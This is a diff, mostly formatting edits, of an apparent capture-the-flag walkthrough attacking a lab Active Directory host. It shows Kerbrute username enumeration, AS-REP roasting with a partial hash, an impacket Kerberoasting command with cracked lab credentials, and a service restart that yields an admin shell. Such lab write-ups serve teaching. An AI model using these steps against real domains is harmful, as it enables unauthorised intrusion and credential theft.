@@ -58,22 +58,22 @@ Open Ports -
 80/tcp    open  http                   # web server Microsoft IIS 10.0         # can try directory enumeration, and other web attacks   
 88/tcp    open  kerberos-sec           # kerberos (handles authentication tickets)     # Username Enumeration for kerbrute > kerberoasting/asreproasting > cracking hash 
 135/tcp   open  msrpc
-139/tcp   open  netbios-ssn            # smb                                         # check for null session, anonymous access, shares enumeration
+139/tcp   open  netbios-ssn            # smb      # check for null session, anonymous access, shares enumeration
 389/tcp   open  ldap
-445/tcp   open  microsoft-ds           # microsoft-ds                                         # check for null session, anonymous access, shares enumeration
+445/tcp   open  microsoft-ds           # microsoft-ds   # check for null session, anonymous access, shares enumeration
 464/tcp   open  kpasswd5
 593/tcp   open  http-rpc-epmap
 636/tcp   open  ldapssl
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl       # LDAP (handles directory lookups)
-3389/tcp  open  ms-wbt-server          # Remote Desktop Protocol, which allows administrators to log in with a GUI.     # only login with valid credentials, do not brute force
+3389/tcp  open  ms-wbt-server          # Remote Desktop Protocol, which allows administrators to log in with a GUI. # only login with valid credentials, do not brute force
 5985/tcp  open  wsman
 9389/tcp  open  adws
 47001/tcp open  winrm                  # Windows Remote Management, Windows version of SSH    # if you can't login to rdp, try this
 ```
 
 ## 🎯 Phase 2: Finding Our Way In
-While you can—and absolutely should—explore the other open ports for practice, I'm am going to focus on the most direct path into this machine. 
+While you can and absolutely should explore the other open ports for practice, We are going to focus on the most direct path into this machine. 
 
 Since we know this is an Active Directory environment named `services.local`, our immediate goal is to find valid domain usernames. If we can get a list of real users, we can attempt an attack called **AS-REP Roasting** (a technique where we look for users that don't require pre-authentication so we can try to crack their password hashes offline).
 
@@ -113,7 +113,7 @@ Active Directory environments usually follow a strict naming convention for empl
 
 First, clone the repository and navigate into the directory:
 ```
-git clone [https://github.com/mohinparamasivam/AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator)
+git clone https://github.com/mohinparamasivam/AD-Username-Generator
 cd AD-Username-Generator
 ```
 
@@ -122,10 +122,10 @@ Figure 4: git clone AD-Username-Generator
 <img width="551" height="130" alt="image-160" src="https://github.com/user-attachments/assets/72151dd1-1930-48c9-86ad-c787fcbe2431" />
 
 Next, create a raw text file named unameservices.txt and paste the harvested names exactly as they appeared, using a Firstname Lastname format:
-Joanne Doe
-Jack Rock
-Will Masters
-Johnny LaRusso
+* Joanne Doe
+* Jack Rock
+* Will Masters
+* Johnny LaRusso
 
 Now, run the Python script. We pass our raw names file as the input (-u) and specify an output file (-o) where our generated combinations will be saved: 
 ```
@@ -142,11 +142,11 @@ To do this without locking out accounts or making too much noise, we use a tool 
 
 First, let's download the compiled Linux binary directly from GitHub using `wget`:
 ```
-wget [https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
 ```
  Before we can run the tool, we need to give it execution permissions using chmod:
 ```
-`chmod +x kerbrute_linux_amd64`
+chmod +x kerbrute_linux_amd64
 ```
 
 Figure 6: Downloading Kerbrute
@@ -216,7 +216,7 @@ Figure 11: Asreproasting
 <img width="625" height="209" alt="image-167" src="https://github.com/user-attachments/assets/7cf1ef4e-9b29-4a8b-936d-c69248ea3fa8" />
 
 While some accounts come back with errors like User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set, the tool successfully hits gold on another account:
-$krb5asrep$23$j.rock@SERVICES.LOCAL:78ab290e76cfd82bf9d313f34ec8e525$18240d0903460288...
+```$krb5asrep$23$j.rock@SERVICES.LOCAL:78ab290e76cfd82bf9d313f34ec8e525$18240d0903460288...```
 
 We successfully intercepted a valid Kerberos hash for the user j.rock and saved it straight to hashes.txt
 
@@ -244,7 +244,7 @@ We use Impacket's GetUserSPNs tool to request tickets for all available SPNs:
 ```
 impacket-GetUserSPNs -dc-ip 10.114.181.105 'services.local/j.rock:Serviceworks1' -request
 ```
-Unfortunately, this avenue came up dry—there are no Kerberoasting-susceptible service accounts configured for our current user privilege levels.
+Unfortunately, this avenue came up dry, there are no Kerberoasting-susceptible service accounts configured for our current user privilege levels.
 
 Figure 13: Kerberoasting
 
@@ -362,6 +362,7 @@ sc.exe start AWSLiteAgent
 Figure 24: Service Restart
 
 <img width="643" height="89" alt="image-184" src="https://github.com/user-attachments/assets/f96fa159-55ce-49a0-b518-519274b5d4a0" />
+
 
 Figure 25: Got the admin shell
 
